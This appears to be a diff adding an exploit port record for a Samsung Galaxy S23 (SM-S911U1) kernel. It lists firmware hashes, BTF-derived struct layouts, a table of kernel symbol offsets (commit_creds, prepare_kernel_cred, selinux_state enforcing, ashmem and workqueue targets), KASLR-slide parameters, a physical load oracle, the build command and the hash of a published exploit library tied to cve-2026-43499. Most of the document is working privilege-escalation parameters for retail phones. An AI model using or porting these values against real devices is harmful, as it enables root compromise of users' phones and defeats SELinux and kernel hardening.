@@ -1,0 +1,197 @@
+# Galaxy S23 SM-S911U1 / S911U1UES6DYI3 port record
+
+This record contains the exact inputs and derived values for the base Galaxy
+S23 (Snapdragon 8 Gen 2 / Kalama, codename `dm1q`) profile
+`dm1q-S911U1UES6DYI3`. The kernel is Samsung's `android13-5.15` branch at
+5.15.153 with KDP, RKP, and DEFEX hardening. It is 36 Android sublevels older
+than the S23 Ultra `dm3q-S9180ZHS8FZF5` profile and — importantly — Samsung
+restructured `task_struct` and `worker_pool` between the two builds, so no
+layout value was carried over from that sibling without re-derivation.
+
+## Firmware identity and acquisition
+
+Samsung FUS was queried with samloader 2.0.0 for model `SM-S911U1`, region
+`XAA`. The four-part DYI3 version was still served as the previous-stable
+binary of its line:
+
+```text
+S911U1UES6DYI3/S911U1OYM6DYI3/S911U1UES6DYI3/S911U1UES6DYI3
+```
+
+Device-side ground truth (read over ADB from the target phone) confirms the
+build:
+
+```text
+model: SM-S911U1
+device: dm1q (product dm1quew)
+display build: AP3A.240905.015.A2.S911U1UES6DYI3
+fingerprint: samsung/dm1quew/dm1q:15/AP3A.240905.015.A2/S911U1UES6DYI3:user/release-keys
+SDK: 35 (Android 15, One UI 7)
+CSC: XAA
+security patch: 2025-09-01
+kernel release: 5.15.153-android13-8-30958972-abS911U1UES6DYI3
+kernel build: #1 SMP PREEMPT Wed Sep 3 06:21:36 UTC 2025
+```
+
+## Kernel extraction and hashes
+
+AP tar → `boot.img.lz4` (LZ4-frame) → boot image header v4, 4096-aligned,
+`kernel_size` u32 at 0x08, kernel blob at 0x1000:
+
+```text
+boot.img size: 100663296
+boot.img SHA-256: 05D52B10E84FBAFB8B09E696D7AAD6BFDB757706EF0168C611B3DE8644FC70F6
+kernel size: 45550080
+kernel SHA-256: A82D979745F3821816A3F870F5DC6A1A595B7C4818D748EF3E620AD823EF30D2
+ARM64 Image text_offset: 0x0
+ARM64 Image flags: 0xa
+```
+
+## Symbol and BTF recovery
+
+`vmlinux-to-elf` recovered 122,985 symbols at image base
+`0xffffffc008000000`. The raw-BTF scan found exactly one validated blob:
+
+```text
+vmlinux.btf: [0x20f5f6c, 0x26a24ae), 5948738 bytes
+```
+
+All exploit-relevant layouts were derived from this BTF. **The task_struct
+layout differs materially from the 5.15.189 S23 profile**: `cred` moved from
+`0x5e0` to `0x798`, `real_cred` to `0x790`, `sched_task_group` sits at
+`0x400`, and the pi block (`pi_lock` `0x884`, `pi_waiters` `0x898`,
+`pi_top_task` `0x8a8`, `pi_blocked_on` `0x8b0`) shifted −0xa0 relative to
+dm3q. `worker_pool.worklist` moved to `0x20` (dm3q 0x28) and `nr_idle` to
+`0x34`. Conversely `rt_mutex_waiter` (`0x58`, task `0x30`, lock `0x38`,
+wake_state+prio `0x40/0x44`), the `file_operations` member offsets
+(llseek `0x08` … splice_read `0xc8`, show_fdinfo `0xe0`; sizeof is `0x120`
+with kabi reserved words), `struct page` (`0x40`, compound_head `0x08`,
+slab_cache `0x18`, page_type `0x30`), `miscdevice.fops` `0x10`, the
+pool_workqueue/workqueue/work_struct fields, and the configfs buffer fields
+are identical to the 5.15.189 GKI layout. `selinux_state.enforcing` is the
+first member (offset `0x0`) in this build.
+
+| Macro/use | Symbol or derivation | Offset |
+| --- | --- | ---: |
+| `INIT_TASK_OFF` | `init_task` | `0x02ac9bc0` |
+| `PREPARE_KERNEL_CRED_OFF` | `prepare_kernel_cred` | `0x0011db04` |
+| `COMMIT_CREDS_OFF` | `commit_creds` | `0x0011f840` |
+| `OVERRIDE_CREDS_OFF` | `override_creds` | `0x0011e918` |
+| `ROOT_TASK_GROUP_OFF` | `root_task_group` | `0x02b79ac0` |
+| `SELINUX_ENFORCING_OFF` | `selinux_state` + 0 (`enforcing` first member) | `0x02c4e438` |
+| `KMALLOC_CACHES_OFF` | `kmalloc_caches` | `0x01f77a90` |
+| `ANON_PIPE_BUF_OPS_OFF` | `anon_pipe_buf_ops` | `0x01da30a0` |
+| `SYSTEM_UNBOUND_WQ_OFF` | `system_unbound_wq` | `0x0295e480` |
+| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | `call_usermodehelper_exec_work` | `0x00103e50` |
+| `ASHMEM_FOPS_OFF` | `ashmem_fops` | `0x01f211d0` |
+| `ASHMEM_MISC_FOPS_OFF` | `ashmem_misc + 0x10` | `0x02ac1b88` |
+| `ASHMEM_IOCTL_OFF` | `ashmem_ioctl` | `0x010b5de0` |
+| `ASHMEM_COMPAT_IOCTL_OFF` | `compat_ashmem_ioctl` | `0x010b643c` |
+| `ASHMEM_MMAP_OFF` | `ashmem_mmap` | `0x010b6494` |
+| `ASHMEM_OPEN_OFF` | `ashmem_open` | `0x010b6774` |
+| `ASHMEM_RELEASE_OFF` | `ashmem_release` | `0x010b680c` |
+| `ASHMEM_SHOW_FDINFO_OFF` | `ashmem_show_fdinfo` | `0x010b6928` |
+| `CONFIGFS_READ_ITER_OFF` | `configfs_read_iter` | `0x005d30a8` |
+| `CONFIGFS_BIN_WRITE_ITER_OFF` | `configfs_bin_write_iter` | `0x005d3ad0` |
+| `COPY_SPLICE_READ_OFF` | `generic_file_splice_read` (5.15.153 predates the `copy_splice_read` rename) | `0x00523f70` |
+| `NOOP_LLSEEK_OFF` | `noop_llseek` | `0x004b6da4` |
+| `SLIDE_NFULNL_LOGGER_NAME_OFF` | `"nfnetlink_log"` string, read from qword 0 of `nfulnl_logger` | `0x01c96c94` |
+| `SLIDE_NFULNL_LOGGER_OBJECT_OFF` | `nfulnl_logger` | `0x02961dc0` |
+| `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` | `.data` slot of the `boot_id` entry (index 4) in `random_table[]` | `0x02a7f960` |
+| `SLIDE_SYSCTL_BOOTID_OFF` | `sysctl_bootid` | `0x02ceaf29` |
+
+Cross-check: the `boot_id` entry's `.data` field in the raw Image contains
+exactly `sysctl_bootid`, confirming both boot-id derivations.
+
+## Slide parameters
+
+- `SLIDE_TRACEFS_EVENT_ID` **108**, read authoritatively on-device from
+  `/sys/kernel/tracing/events/sched/sched_blocked_reason/id`. The offline
+  computation agrees: `__event_sched_blocked_reason (0xffffffc00a9177d8) -
+  __start_ftrace_events (0xffffffc00a917518)) / 8 = 88` zero-based index, and
+  `__TRACE_LAST_TYPE == 20` ⇒ 108.
+- `SLIDE_TRACEFS_WORKER_CALLER_OFF` `0x0010d370`: in `worker_thread`, the
+  blocking `bl schedule` is at `0xffffffc00810d36c`; the following
+  instruction (`nop` at `+0x78`) is the saved return PC.
+- `SLIDE_PSELECT_WORD_SHIFT` **3** — the android13-5.15 family value. The
+  static frame-chain analysis on this build is inconclusive: measuring from
+  the syscall entry SP, the `core_sys_select` fd-set copy base
+  (`__arm64_sys_pselect6` 0xa0 frame → `core_sys_select` 0x1c0 frame, bits at
+  SP+0x50) sits at −0x210, while the `rt_waiter` local of the
+  `FUTEX_WAIT_REQUEUE_PI` path (`__arm64_sys_futex` 0x80 → `do_futex` 0x140 →
+  `futex_wait_requeue_pi` 0x1b0 frame, waiter at SP+0x98, confirmed via the
+  `try_to_take_rt_mutex`/`rt_mutex_slowlock_block` argument registers) sits
+  at −0x2d8, i.e. 25 qwords below the copy base, outside the 15-qword copied
+  region. The S926B record documents the same class of static-vs-hardware
+  divergence (static said 0, hardware proved 3 and was corrected by panic
+  readback), so the family default is used until a device run says otherwise.
+  If the first device run faults or reports waiter misalignment in
+  `rt_mutex_adjust_prio_chain`, read the qword displacement from the
+  diagnostic/panic output and adjust this single constant.
+
+## Physical load proof
+
+The BL archive of this Qualcomm target contains `abl.elf` (ARM32 EFI
+application, stripped release build) rather than `sboot.bin`; it carries no
+ analyzable load-address literals. `P0_PHYS_OFFSET 0x80000000` /
+`P0_KERNEL_PHYS_LOAD 0x80080000` are adopted from the same-SoC (SM8550)
+`dm3q-S9180ZHS8FZF5` record and the Qualcomm ABL convention for ARM64 boot
+images. This choice is fail-closed: the physical P0 oracle must
+fingerprint-match the probed page against the table below or the exploit
+aborts before any write.
+
+## P0 table and payload build
+
+`src/targets/dm1q-S911U1UES6DYI3/p0_fingerprint.h` was generated with
+`tools/generate_p0_fingerprint.pl` at probe offset `0x1f0000`
+(= `P0_ORACLE_PROBE_OFFSET`, the runtime probe address derived from
+`P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) + P0_ORACLE_PROBE_OFFSET`); all 32
+slide candidates and 256 source qwords verified by readback.
+
+```sh
+make TARGET=dm1q-S911U1UES6DYI3 ANDROID_NDK_HOME=... release
+```
+
+The fixed-size result (104128 bytes) is published at
+`artifacts/dm1q-S911U1UES6DYI3/cve-2026-43499-app.so`:
+
+```text
+SHA-256 12b43d1d05f17be4f304796dac7658970adf5cac5af29937146a379ccf1ad591
+```
+
+Every symbol offset in `target.h` was re-validated programmatically against
+`vmlinux.nm` after the initial build (this caught six ashmem offsets that
+would otherwise have shipped wrong).
+
+## dm3q P0 fingerprint discrepancy
+
+While surveying sibling profiles, `src/targets/dm3q-S9180ZHS8FZF5/p0_fingerprint.h`
+was found generated at probe `0x400000`, while every other profile and the
+runtime oracle math (`P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) +
+P0_ORACLE_PROBE_OFFSET` with `P0_ORACLE_PROBE_OFFSET == 0x1f0000`) use
+`0x1f0000`. If the dm3q table content (not just its comment) really was
+generated at 0x400000, that profile's physical oracle cannot match on
+hardware and should be regenerated. This port used 0x1f0000.
+
+## KernelSU compatibility
+
+Pending: the module is built from KernelSU `v3.2.5` (commit `b0bc817`, patch
+`kernelsu/patches/KernelSU-v3.2.5-samsung-kdp-rkp-defex.patch` applies
+cleanly) against the Samsung OSS `SM-S911B_15_Opensource_S911BXXS8DYI3`
+Kalama 5.15 tree with the exact target release override:
+
+```text
+vermagic: 5.15.153-android13-8-30958972-abS911U1UES6DYI3 SMP preempt mod_unload modversions aarch64
+```
+
+This section will be completed with the static audit numbers
+(`check_symbol` + `audit_module_against_target.py --manual-relocation`)
+after the source package is obtained.
+
+## Validation state
+
+The profile and offsets are mathematically and statically validated against
+the S911U1UES6DYI3 firmware binaries, and the trace event ID was confirmed
+on-device. Hardware execution on the SM-S911U1 has not yet been performed;
+`SLIDE_PSELECT_WORD_SHIFT` is the one constant expected to possibly need a
+device-run correction.
